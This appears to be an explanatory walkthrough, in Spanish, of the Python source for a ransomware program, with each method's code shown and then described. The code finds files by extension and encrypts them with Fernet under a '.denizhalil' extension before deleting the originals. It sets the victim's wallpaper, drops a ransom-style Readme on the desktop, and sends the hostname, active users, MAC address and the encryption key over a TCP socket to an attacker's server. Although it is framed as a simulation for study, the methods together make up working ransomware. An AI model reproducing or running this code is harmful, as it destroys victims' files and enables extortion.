## Método para cambiar la foto de pantalla
```
 def change_wallpaper(self, image_path):
        if os.name == 'nt':
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path , 0)

        else:
            print("Wallpaper change feature is not supported on this OS.")
```
* En este método se recibe como parametros las intancia de clase y la ruta de la imagen a colocar en la terminal de la victima (sólo funcional para sistemas windows).
Realiza una validacíon para obtener el nombre del sistema, si este coincide con un sistema windows ejectuta la libreria user32.dll para editar la interfaz grafica y poner setear la imagen de fondo de pantalla.
## Método para obtener la dirección mac del equipo
```
    def get_mac_address(self):
        mac_num = hex(uuid.getnode()).replace('0x', '').upper()
        mac_num = mac_num.zfill(12)
        mac = ':'.join(mac_num[i: i + 2] for i in range(0, 12, 2))
        return mac
```
* En este método se recibe el parametro de la instancia de clase y usa la libreria uuid para obtener la dirección mac, elimina los primeros valores ('0x') y lo convertirte a mayusculas, cada dos valores añade lel caracter de ':'.
## Método para crear el archivo de instrucciones (readme)
```
    def create_readme(self):
        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        readme_path = os.path.join(desktop_path, 'Readme.txt')
        with open(readme_path, 'w') as file:
            file.write("This is a simulation program, your files are encrypted.")

```
* En este método se recibe el parametro de instancia de clase, hace llamados a las variables de entorno por medio de la libreria Os e identifica la ruta de escritiorio para generar un archivo readme.txt con el contendido previamente diligenciado en el método write.
## Método para encriptar los archivos
```
    def encrypt_file(self, file_path):
        fernet = Fernet(self.key)
        with open(file_path, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)

        encrypted_file_path = file_path + ".denizhalil"
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        os.remove(file_path)
        return encrypted_file_path
```
* En este método se se recibe el parametro de instancia de clase y la ruta donde se encuentran los archivos a los que se desea atacar, se crea un objeto fernet con la clave previamente generada en base64, abre el contenido de la ruta y lee su contenido, utiliza el objeto fernet para cifrar el contenido que ya ha sido leido, cambia la extension del archivo por .denizhalil y elimina el archivo original, por ultimo retorna la ruta del archivo cifrado.
## Método para buscar archivos y recorrer directorios
```
    def find_and_encrypt_files(self):
        encrypted_files = []
        for root, _, files in os.walk(self.directory):
            for file in files:
                if any(file.endswith(ext) for ext in self.file_extensions):
                    file_path = os.path.join(root, file)
                    encrypted_file_path = self.encrypt_file(file_path)
                    encrypted_files.append(encrypted_file_path)
                    print(f"Encrypted and saved file: {encrypted_file_path}")
        return encrypted_files
```
* En este método se recibe la instancia de clase, inicializa un arreglo vacío para almacenar la ruta de los archivos cifrados, recorre de manera recursiva todos los directorios y archivos desde el self.directory con el método os.walk, ubica los archivos de interes usando las extensiones previamente seleccionadas, llama al método encrypt_file para realizar el proceso de cifrado, agrega la ruta del archivo cifrado al arreglo encrypted_files y por ultimo retorna la lista de archivos cifrados.
## Método para obtener usuarios activos
```
    def get_active_users(self):
        try:
            command = 'query user' if os.name == 'nt' else 'who'
            output = subprocess.check_output(command, shell=True)
            return output.decode(errors='ignore')
        except subprocess.CalledProcessError:
            return "Unable to fetch active users"
```
* Este método recibe la instancia de clase, determina si el sistema operativo es windows o unix, para el caso de windows usa el comando query user que arroja todos los usuarios activos de la maquina, para el caso de unix, el comando who muestra los usuarios que hayan iniciado session en el sistema, ambos comandos proporcionan valores como nombre de usuario, fecha y hora del inicio de sesion y estado del usuario, por ultimo retorna la lista de usuarios activos.
## Método para agrupar la información
```
    def collect_data(self):
        return {
            'hostname': socket.gethostname(),
            'key': self.key.decode(),
            'active_users': self.get_active_users(),
            'mac_address': self.get_mac_address()
        }
```
Este método recibe como parametro la instancia de clase, recolecta en un Json la información del sistema: nombre del equipo, clave de cifrado, usuarios activos, y dirección Mac de la red.
## Método para recolectar la información y castear a Json
```
    def send_data_to_server(self):
        data = self.collect_data()
        self.send_to_server(json.dumps(data))
```
* Este método recibe como parametro la instancia de clase, llama al método collect_data() para obtener la información del sistema, convierte el diccionario a formato json y envia los datos con el metodo send_to_server.
## Método para enviar la información al atacante
```
    def send_to_server(self, data):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server_host, self.server_port))
                s.sendall(data.encode())
        except:
            quit(0)
```
Este método recibe como parametros la instacia de clase y la información en formato Json que se desea enviar, crea un socket TCP e intenta conectarse al servidor remoto usando el dominio y el puerto parametrizado anteriormente, envia la información codificada de string a bytes.
## Método para forzar el recolector de basura
```
    def clear_memory(self):
        gc.collect()
        print("Memory cleared.")
```
* Recibe como parametro la instancia de clase y llama a la libreria GC para forzar un barrido de memoria al terminar la ejecucción del script.